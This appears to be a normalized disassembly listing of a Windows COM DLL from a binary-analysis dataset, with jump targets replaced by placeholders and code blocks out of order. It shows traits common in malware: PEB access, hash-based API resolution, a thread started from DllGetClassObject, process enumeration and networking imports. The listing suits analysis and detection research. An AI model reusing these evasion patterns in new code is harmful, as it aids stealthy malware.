push 0x1
push 0x2
push edi
call [ eax ]
mov esi [ GetMessageA@IAT ]
xor edi edi
jmp r-xdata
lea eax [ ebp - 0x24 ]
push eax
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0x24 ]
push eax
call [ DispatchMessageA@IAT ]
pop edi
pop esi
mov al 0x1
pop ebx
leave
retn
sub_10007ac4
push ebp
mov ebp esp
sub esp 0x5c
push 0x10
push r--data
push [ ebp + 0x10 ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
push esi
push edi
push 0x5
lea esi [ ebp - 0x5c ]
pop edi
mov eax 0x80020001
jmp r-xdata
push esi
call [ VariantInit@IAT ]
add esi 0x10
dec edi
jne r-xdata
cmp [ ebp + 0xc ] 0xfa
jne r-xdata
leave
retn 0x24
push 0x5
lea esi [ ebp - 0x5c ]
pop edi
mov edi [ ebp + 0x1c ]
mov eax [ edi ]
mov esi [ VariantChangeType@IAT ]
push ebx
push 0x8
xor ebx ebx
push ebx
add eax 0x50
push eax
lea eax [ ebp - 0x5c ]
push eax
call esi
mov eax [ edi ]
push 0x3
push ebx
add eax 0x40
push eax
lea eax [ ebp - 0x4c ]
push eax
call esi
mov eax [ edi ]
push 0x8
push ebx
add eax 0x30
push eax
lea eax [ ebp - 0x3c ]
push eax
call esi
mov eax [ edi ]
push 0x2011
push ebx
add eax 0x20
push eax
lea eax [ ebp - 0x2c ]
push eax
call esi
mov eax [ edi ]
push 0x8
push ebx
add eax 0x10
push eax
lea eax [ ebp - 0x1c ]
push eax
call esi
cmp [ ebp - 0x2c ] bx
je r-xdata
push esi
call [ VariantClear@IAT ]
add esi 0x10
dec edi
jne r-xdata
pop edi
xor eax eax
pop esi
mov [ ebp - 0x4 ] ebx
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp - 0x24 ]
call [ SafeArrayGetLBound@IAT ]
lea eax [ ebp - 0xc ]
push eax
push ebx
push [ ebp - 0x24 ]
call [ SafeArrayGetUBound@IAT ]
lea eax [ ebp - 0x4 ]
push eax
push [ ebp - 0x24 ]
call [ SafeArrayAccessData@IAT ]
jmp r-xdata
mov eax [ edi ]
cmp [ ebp + 0x13 ] bl
mov eax [ eax + 0x8 ]
pop ebx
je r-xdata
push [ ebp - 0x24 ]
call [ SafeArrayUnaccessData@IAT ]
mov eax [ edi ]
mov eax [ eax + 0x8 ]
cmp [ eax ] bx
setne [ ebp + 0x13 ]
cmp [ ebp - 0x2c ] bx
je r-xdata
xor ecx ecx
or ecx 0xffffffff
jmp r-xdata
mov [ eax ] cx
sub_10007bfb
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx edi
call sub_100078a9
test esi esi
jne r-xdata
mov eax [ esi ]
push esi
call [ eax + 0x4 ]
mov eax [ esi ]
push ebx
lea ecx [ edi + 0x10 ]
push ecx
push r--data
push esi
call [ eax ]
mov ebx eax
mov eax [ esi ]
push esi
call [ eax + 0x8 ]
test ebx ebx
jns r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
call sub_10007850
xor eax eax
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x8
pop ebx
sub_10007c4e
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
push rw-data
mov [ esi + 0x4 ] 0x0
call [ InterlockedIncrement@IAT ]
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0xc ] eax
mov eax esi
pop esi
pop ebp
retn 0x8
sub_10007c98
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000790d
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100046eb
pop ecx
sub_10007cbd
push esi
push 0x2
push rw-data
mov esi ecx
call sub_10007c4e
xor eax eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_10007ce1
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007be5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100046eb
pop ecx
DllGetClassObject
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0x4
call sub_100046cb
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov [ rw-data ] ebx
mov ecx eax
call sub_10001000
mov [ rw-data ] eax
jmp r-xdata
mov edi [ ebp + 0x10 ]
push 0x4
push edi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov esi [ GetLastError@IAT ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
mov ebx r--data
push ebx
push 0x1
push 0x3
mov edi r--data
push edi
call [ eax ]
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
push 0x10
push r--data
push [ ebp + 0x8 ]
call sub_10004169
add esp 0xc
test eax eax
je r-xdata
push 0x10
mov [ edi ] ebx
call sub_100046cb
pop ecx
cmp eax ebx
je r-xdata
mov eax 0x80004003
jmp r-xdata
xor ebx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
call esi
mov ecx [ rw-data ]
push eax
mov eax [ ebp - 0x4 ]
push ebx
push 0x1
push 0x4
push edi
call [ eax ]
mov eax 0x80040111
jmp r-xdata
xor esi esi
mov ecx eax
call sub_10007c7f
mov esi eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ esi ]
push edi
push [ ebp + 0xc ]
push esi
call [ eax ]
test eax eax
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
cmp esi ebx
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
push sub_100079b5
push ebx
push ebx
call [ CreateThread@IAT ]
xor eax eax
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
sub_10007e1a
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
je r-xdata
push edi
mov edi [ ebp + 0x14 ]
push 0x4
push edi
call [ IsBadWritePtr@IAT ]
test eax eax
je r-xdata
mov eax 0x80040110
jmp r-xdata
and [ edi ] 0x0
push esi
push 0x1c
call sub_100046cb
pop ecx
test eax eax
je r-xdata
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x10
xor esi esi
mov ecx eax
call sub_10007cbd
mov esi eax
jmp r-xdata
pop edi
mov eax [ esi ]
push edi
push [ ebp + 0x10 ]
push esi
call [ eax ]
mov edi eax
test edi edi
jns r-xdata
mov eax 0x8007000e
jmp r-xdata
test esi esi
jne r-xdata
mov eax edi
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax + 0x14 ]
pop esi
sub_10007eae
push esi
push edi
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi r--data
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
retn
sub_10001000
mov eax ecx
mov [ eax ] r--data
retn
sub_10001009
retn 0x14
sub_100017d8
mov eax [ fs : 0x30 ]
retn
sub_1000181c
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
push 0x4b1ffe8e
call sub_100017df
pop ecx
mov [ rw-data ] eax
sub_100018b4
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
lea edx [ ecx - 0x1 ]
xor eax eax
cmp edx 0x242
ja r-xdata
pop ebp
retn
mov eax [ ecx * 4 + rw-data ]
sub_10001ad4
push ebp
mov ebp esp
push 0x0
push 0x9
push 0x1
push 0x11
call sub_100019d2
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001aee
push ebp
mov ebp esp
push 0x0
push 0x14
push 0x1
push 0x14
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001b04
push ebp
mov ebp esp
push 0x0
push 0xd
push 0x1
push 0x16
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001b46
push ebp
mov ebp esp
push 0x0
push 0xe
push 0x1
push 0x1a
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001b5c
push ebp
mov ebp esp
push 0x0
push 0x36
push 0x1
push 0x23
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001b72
push ebp
mov ebp esp
push 0x0
push 0x34
push 0x1
push 0x25
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001bd7
push ebp
mov ebp esp
push 0x0
push 0x8
push 0x1
push 0x2d
call sub_100019d2
add esp 0x10
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_10001bf1
push ebp
mov ebp esp
push 0x0
push 0x19
push 0x1
push 0x2f
call sub_100019d2
add esp 0x10
pop ebp
jmp eax
sub_10001c47
push 0x0
push 0x24
push 0x1
push 0x6d
call sub_100019d2
add esp 0x10
jmp eax
sub_1000210e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
pop ebp
jmp sub_100020c3
xor al al
pop ebp
retn
sub_10002245
push ebp
mov ebp esp
pop ebp
jmp sub_10002139
sub_10002ec1
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
mov [ esi ] r--data
test eax eax
je r-xdata
mov [ esi ] r--data
pop esi
retn
push eax
call sub_10002139
pop ecx
sub_10003283
call sub_100017d8
mov eax [ eax + 0x1d4 ]
retn
sub_1000328f
mov eax r--data
retn
sub_100040b7
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10004069
cmp [ ebp + 0x8 ] ax
sete al
pop ebp
retn 0xc
sub_10004235
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_10004242
mov [ ecx + 0x10 ] 0x1
retn
sub_10004278
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0xc ] eax
pop ebp
retn 0x4
sub_10004285
mov [ ecx + 0x11 ] 0x1
retn
sub_1000444a
push [ ecx ]
call sub_1000470c
pop ecx
retn
sub_10004534
push esi
mov esi ecx
call sub_100044ec
mov eax esi
pop esi
retn
sub_10004dce
mov eax [ ecx + 0x4 ]
retn
sub_10004dd2
mov eax [ ecx + 0x8 ]
retn
sub_10004dd6
mov eax [ ecx + 0xc ]
retn
sub_10006cce
mov ecx [ ecx + 0x4 ]
jmp sub_10004dce
sub_10006ffc
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10006fde
mov [ esi ] r--data
pop esi
retn
sub_10007712
push ebp
mov ebp esp
push 0x10
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004169
add esp 0xc
neg eax
sbb eax eax
inc eax
pop ebp
retn
_start
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
xor eax eax
inc eax
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov [ rw-data ] eax
call [ DisableThreadLibraryCalls@IAT ]
DllCanUnloadNow
mov eax [ rw-data ]
xor ecx ecx
test eax eax
setg cl
mov eax ecx
retn
DllUnregisterServer
xor eax eax
retn
sub_1000775d
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x0
push rw-data
je r-xdata
call [ InterlockedDecrement@IAT ]
call [ InterlockedIncrement@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn 0x8
sub_100077f3
xor eax eax
inc eax
retn 0x4
sub_100077f9
mov eax 0x80004001
retn 0x8
sub_10007801
mov eax 0x80004001
retn 0x10
sub_10007809
mov eax 0x80004001
retn 0x18
sub_1000790d
push rw-data
mov [ ecx ] r--data
call [ InterlockedDecrement@IAT ]
retn
sub_10007982
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
pop ebp
retn 0x4
sub_10007be5
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100078a9
mov ecx esi
pop esi
jmp sub_1000790d
sub_10007c7f
push esi
push 0x2
push rw-data
mov esi ecx
call sub_10007c4e
mov [ esi ] r--data
mov eax esi
pop esi
retn
ObtainUserAgentString
jmp [ ObtainUserAgentString@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
Process32Next
jmp [ Process32Next@IAT ]
Process32First
jmp [ Process32First@IAT ]
